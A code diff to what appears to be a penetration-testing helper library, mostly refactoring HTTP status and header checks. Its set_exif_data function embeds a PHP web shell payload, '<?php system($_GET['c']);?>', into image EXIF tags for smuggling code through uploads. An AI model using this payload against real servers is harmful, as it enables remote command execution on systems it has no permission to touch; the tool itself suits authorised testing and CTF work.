@@ -5,7 +5,6 @@ import socket
 import netifaces as ni
 import string
 import sys
-import exif
 import os
 import io
 from PIL import Image
@@ -46,22 +45,26 @@ def exit_with_error(res, err):
 
 def assert_status_code(res, status_code, err=None):
     if res.status_code != status_code:
-        err = f"[-] Server returned unexpected status code {res.status_code}, expected: {status_code}" if err is None else err
+        err = f"[-] '{res.url}' returned unexpected status code {res.status_code}, expected: {status_code}" if err is None else err
         exit_with_error(res, err)
-        exit()
+
+def assert_header_present(res, header, err=None):
+    if header in res.headers:
+        return
+        
+    err = f"[-] '{res.url}' did not return header: {header}" if err is None else err
+    exit_with_error(res, err)
 
 def assert_content_type(res, content_type, err=None):
-    if "Content-Type" in res.headers:
-        return
+    assert_header_present(res, "Content-Type")
     content_type_header = res.headers["Content-Type"].lower()
     if content_type_header == content_type.lower():
         return
     if content_type_header.lower().startswith(content_type.lower() + ";"):
         return
 
-    err = f"[-] Server returned unexpected status code {res.status_code}, expected: {status_code}" if err is None else err
+    err = f"[-] '{res.url}' returned unexpected content type {content_type_header}, expected: {content_type}" if err is None else err
     exit_with_error(res, err)
-    exit()
 
 def openServer(address, ports=None):
     listenPort = None
@@ -147,6 +150,7 @@ def pad(x, n):
     return x
 
 def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
+    import exif
 
     if _in is None or (isinstance(_in, str) and not os.path.exists(_in)):
         _in = Image.new("RGB", (50,50), (255,255,255))
@@ -159,7 +163,7 @@ def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, ex
         _in = exif.Image(bytes.getvalue())
     elif not isinstance(_in, exif.Image):
         print("Invalid input. Either give an Image or a path to an image.")
-        return
+        exit()
 
     valid_tags = list(exif._constants.ATTRIBUTE_NAME_MAP.values())
     if exif_tag is None:
@@ -167,17 +171,19 @@ def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, ex
     elif exif_tag == "all":
         for exif_tag in valid_tags:
             try:
-                _in[exif_tag] = payload
-                print("adding:", exif_tag)
+                print("Setting exif tag:", exif_tag)
+                _in.set(exif_tag, payload)
             except Exception as e:
+                print("Error setting exif tag:", exif_tag, str(e))
                 pass
     else:
         if exif_tag not in valid_tags:
             print("Invalid exif-tag. Choose one of the following:")
             print(", ".join(valid_tags))
-            return
+            exit()
 
-        _in[exif_tag] = payload
+        res = _in.set(exif_tag, payload)
+        
 
     if _out is None:
         return _in.get_file()
@@ -280,9 +286,7 @@ if __name__ == "__main__":
             else:
                 _out = ".".join(_out[0:-1]) + "_exif." + _out[-1]
 
-            output = set_exif_data(payload, _in, _out, tag)
-            sys.stdout.buffer.write(output)
-            sys.stdout.flush()
+            set_exif_data(payload, _in, _out, tag)
     else:
         print("Usage: %s [command]" % bin)
         print("Available commands:")
